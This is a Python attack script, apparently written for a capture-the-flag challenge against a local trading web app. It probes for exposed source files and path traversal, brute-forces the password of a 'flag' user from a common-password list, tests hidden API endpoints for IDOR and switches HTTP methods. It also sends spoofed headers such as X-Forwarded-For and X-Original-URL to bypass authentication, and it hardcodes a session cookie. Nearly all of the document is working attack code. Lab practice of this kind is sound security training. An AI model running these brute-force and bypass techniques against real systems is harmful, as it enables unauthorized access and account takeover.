import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("ADVANCED TESTING - Source Files and Login Bypass")
print("=" * 80)

# Look for Python source files at root
print("\n[1] Looking for Python source files")
print("-" * 80)

source_files = [
    '/app.py', '/views.py', '/main.py', '/model.py', '/db.py',
    '/config.py', '/settings.py', '/routes.py', '/password.py',
    '/__init__.py', '/utils.py', '/helpers.py',
    '/.app.py', '/.views.py',
    # Flask common patterns
    '/application.py', '/website.py', '/run.py', '/wsgi.py',
    # Try parent directory traversal for source
    '/../app.py', '/../views.py', '/../main.py',
    '/../password.py', '/../models.py',
    # Check for requirements file
    '/requirements.txt',
    # Check for README
    '/README.md', '/README.txt'
]

for path in source_files:
    try:
        r = session.get(f"{BASE_URL}{path}", timeout=3)
        if r.status_code == 200:
            content_type = r.headers.get('Content-Type', '')
            print(f"\n[!] Found: {path}")
            print(f"Content-Type: {content_type}")
            print(f"Length: {len(r.text)}")
            
            # If it looks like source code or text
            if 'text' in content_type or 'python' in content_type.lower() or len(r.text) < 5000:
                print(f"Content:\n{r.text[:2000]}")
    except Exception as e:
        pass

print("\n" + "=" * 80)
print("[2] Brute force password for flag user (extended)")
print("=" * 80)

# Extended password list for flag user
passwords = [
    'flag', 'Flag', 'FLAG', 'flagflag',
    'password', '123456', 'password123', '12345678',
    'admin', 'root', 'test', 'user', 'trading',
    'tradingplatform', 'platform', 'trading123',
    '12345', 'qwerty', 'letmein', 'welcome',
    'ctf', 'capture', 'theflag', 'the',
    'secret', 'hidden', 'secure', 'pass',
    'flaguser', 'flag_user', 'flag-user',
    '10052', 'user10052', '10052user',
    # Common CTF passwords
    'pwned', 'hacker', 'exploit', 'vuln',
    's3cr3t', 'p@ssw0rd', 'P@ssw0rd'
]

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

for password in passwords:
    form_data = {'username': 'flag', 'password': password, 'user_id': '10052'}
    r = session.post(f"{BASE_URL}/password/flag", data=urlencode(form_data), headers=headers)
    
    if "FLAG{" in r.text:
        print(f"\n[!] FLAG FOUND with password: {password}")
        print(f"Response:\n{r.text}")
        break
    elif "Incorrect password" in r.text:
        print(f"[X] Password '{password}': Incorrect")
    elif "Welcome" in r.text:
        welcome = re.search(r'Welcome, ([^!<]+)', r.text)
        if welcome:
            print(f"\n[!] Password '{password}' worked! Welcome: {welcome.group(1).strip()}")
            print(f"Response:\n{r.text[:2000]}")
            break
    elif r.status_code == 302:
        print(f"\n[!] Password '{password}' caused redirect (possible success)")
        print(f"Redirect location: {r.headers.get('Location', 'N/A')}")
    else:
        print(f"[?] Password '{password}': Status {r.status_code}, length {len(r.text)}")

print("\n" + "=" * 80)
print("[3] Check for IDOR in hidden API parameters")
print("=" * 80)

# Maybe there's a JSON API endpoint hidden
api_tests = [
    ('/api/password', {'user_id': '10052', 'action': 'change'}),
    ('/api/user', {'user_id': '10052'}),
    ('/api/flag', {}),
    ('/api/login', {'username': 'flag', 'password': 'flag'}),
]

for endpoint, data in api_tests:
    try:
        # Try JSON
        r = session.post(f"{BASE_URL}{endpoint}", json=data, timeout=5)
        if r.status_code != 404:
            print(f"\n{endpoint} (JSON): Status {r.status_code}")
            print(f"Response: {r.text[:500]}")
        
        # Try form data
        r2 = session.post(f"{BASE_URL}{endpoint}", data=data, timeout=5)
        if r2.status_code != 404:
            print(f"\n{endpoint} (form): Status {r2.status_code}")
            print(f"Response: {r2.text[:500]}")
    except:
        pass

print("\n" + "=" * 80)
print("[4] Test HTTP method switching")
print("=" * 80)

# Try different HTTP methods on /password/flag
methods = ['PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE']
for method in methods:
    try:
        r = session.request(method, f"{BASE_URL}/password/flag", timeout=5)
        if r.status_code != 405 and r.status_code != 404:
            print(f"\n{method} /password/flag: Status {r.status_code}")
            if len(r.text) < 1000:
                print(f"Response: {r.text[:500]}")
    except:
        pass

print("\n" + "=" * 80)
print("[5] Check for authentication bypass headers")
print("=" * 80)

# Try various auth bypass techniques
bypass_headers_list = [
    {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
    {'X-Forwarded-Host': 'localhost'},
    {'X-Original-URL': '/password/flag'},
    {'X-Rewrite-URL': '/password/flag'},
    {'X-HTTP-Method-Override': 'POST'},
]

for headers in bypass_headers_list:
    try:
        r = session.get(f"{BASE_URL}/password/flag", headers=headers, timeout=5)
        if "FLAG{" in r.text:
            print(f"\n[!] FLAG FOUND with headers: {headers}")
            print(f"Response:\n{r.text}")
            break
    except:
        pass

print("\n[ADVANCED TESTING COMPLETE]")

